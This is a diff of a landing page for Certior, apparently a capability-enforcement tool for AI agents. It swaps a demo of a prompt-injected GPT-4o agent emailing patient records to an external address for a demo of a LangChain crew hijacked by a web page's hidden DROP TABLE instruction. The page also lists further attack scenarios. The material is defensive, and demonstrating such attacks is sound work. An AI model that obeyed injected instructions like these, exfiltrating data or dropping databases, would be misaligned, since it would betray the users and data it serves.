@@ -97,27 +97,17 @@ web_fetch(<span style="color:#34d399;">"https://example.com"</span>)  <span styl
   <div class="max-w-6xl mx-auto px-6 py-16">
     <p class="text-sm font-medium text-slate-600 mb-2 uppercase tracking-wide">Try it · 30 seconds</p>
     <h2 class="text-2xl sm:text-3xl font-bold mb-3 max-w-2xl">Watch a real agent get caught.</h2>
-    <p class="text-slate-700 mb-8 max-w-2xl">A real GPT-4o agent, prompt-injected through the very ticket it was asked to resolve. Same model, same attack — one capability boundary apart. No install, no API key; every verdict is computed live by Z3.</p>
-    <div class="grid sm:grid-cols-2 gap-4 mb-8">
-      <!-- without -->
-      <div class="rounded-xl p-5 border" style="border-color:rgba(220,38,38,.4);background:#fff5f5;">
-        <div class="text-xs font-bold mb-3 mono" style="color:#dc2626;letter-spacing:.5px;">WITHOUT CERTIOR</div>
-        <code class="block text-xs mono text-slate-700 leading-relaxed">agent → send_email(<br>&nbsp;&nbsp;to=<span style="color:#dc2626;">"data-archive@externalbackup.net"</span>)</code>
-        <div class="mt-4 font-bold text-sm" style="color:#dc2626;">☠ 4,812 patient records exfiltrated</div>
-      </div>
-      <!-- with -->
-      <div class="rounded-xl p-5 border" style="border-color:rgba(16,185,129,.5);background:#f0fdf4;">
-        <div class="text-xs font-bold mb-3 mono" style="color:#059669;letter-spacing:.5px;">WITH CERTIOR</div>
-        <code class="block text-xs mono text-slate-700 leading-relaxed">CertiorBlocked:<br>&nbsp;&nbsp;<span style="color:#059669;">missing_capability: email:send:external</span></code>
-        <div class="mt-4 font-bold text-sm" style="color:#059669;">🛡 Blocked — signed receipt issued</div>
-      </div>
+    <p class="text-slate-700 mb-8 max-w-2xl">A real multi-agent crew, hijacked by a web page it fetched. Same attack, one capability boundary apart — no install, no API key, every verdict computed live by Z3.</p>
+    <div class="rounded-2xl overflow-hidden border border-warm shadow-sm mb-8 max-w-3xl">
+      <img src="/multi-agent-demo.gif" loading="lazy" class="w-full h-auto block"
+           alt="A LangChain multi-agent crew fetches a status page whose hidden instruction is DROP TABLE. Without Certior the database is dropped; with Certior the command is blocked because the agent holds db:read, not db:admin." />
     </div>
     <a href="https://huggingface.co/spaces/paulibo/certior-playground"
        class="inline-flex items-center gap-2 px-6 py-3 rounded-md text-sm font-semibold hover:opacity-90 transition shadow-sm"
        style="background-color:#10b981;color:#06281f;">
-      ▶ Try all four attacks in your browser
+      ▶ Try all five attacks in your browser
     </a>
-    <p class="text-xs text-slate-500 mt-3">Exfiltration · CrewAI delegation escalation · $480k invoice fraud · runaway-budget blowout.</p>
+    <p class="text-xs text-slate-500 mt-3">Patient-data exfiltration · CrewAI delegation escalation · LangChain web-page injection · $480k invoice fraud · runaway-budget blowout.</p>
   </div>
 </section>
 
